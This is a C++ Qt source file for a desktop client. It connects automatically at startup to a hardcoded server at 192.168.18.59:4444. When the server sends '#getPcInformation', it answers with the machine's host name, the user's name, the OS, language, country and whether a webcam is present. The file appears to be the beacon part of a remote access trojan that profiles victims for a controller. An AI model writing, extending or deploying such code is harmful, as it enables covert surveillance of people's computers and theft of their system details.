#include "mainwindow.h"
#include "ui_mainwindow.h"

MainWindow::MainWindow(QWidget *parent)
    : QMainWindow(parent)
    , ui(new Ui::MainWindow)
{
    ui->setupUi(this);
    ClientStartup();
}

MainWindow::~MainWindow()
{
    delete ui;
}



void MainWindow::ClientStartup()
{
    socket = new QTcpSocket(this);

    QObject::connect(socket, &QTcpSocket::connected,this,[&](){
        qDebug() << "[+] Succesful connected to the server.";

        QObject::connect(socket,&QTcpSocket::readyRead,this,[&](){
            qDebug() << "[+] New message from the server.";

            QByteArray data = socket->readAll();

            if(data == "#getPcInformation")
            {
                QLocale currentLocale = QLocale::system();
                QString language = currentLocale.name().section('_', 0, 0);

                QString country = QLocale::territoryToString(currentLocale.territory());

                QString camAnsw;

                if (QMediaDevices::videoInputs().count() > 0)
                {
                    camAnsw = "Yes";
                }
                else
                {
                    camAnsw = "No";
                }

                QByteArray Data = "#getPcInformation:" + QSysInfo::machineHostName().toLatin1() + ":" + QDir::home().dirName().toLatin1() + ":" + "N/A" + ":" + QSysInfo::prettyProductName().toLatin1() + ":" + language.toLatin1() + ":" + country.toLatin1() + ":" + camAnsw.toLatin1();
                socket->write(Data);
            }
        });

        QObject::connect(socket,&QTcpSocket::disconnected,this,[&](){
            qDebug() << "[-] Disconnected from the server.";
            socket->disconnectFromHost();
            socket->deleteLater();
        });
    });

    socket->connectToHost("192.168.18.59",4444);
}

void MainWindow::on_pushButton_clicked()
{
    QByteArray dataForServer = "Hello Server!";
    socket->write(dataForServer);
}

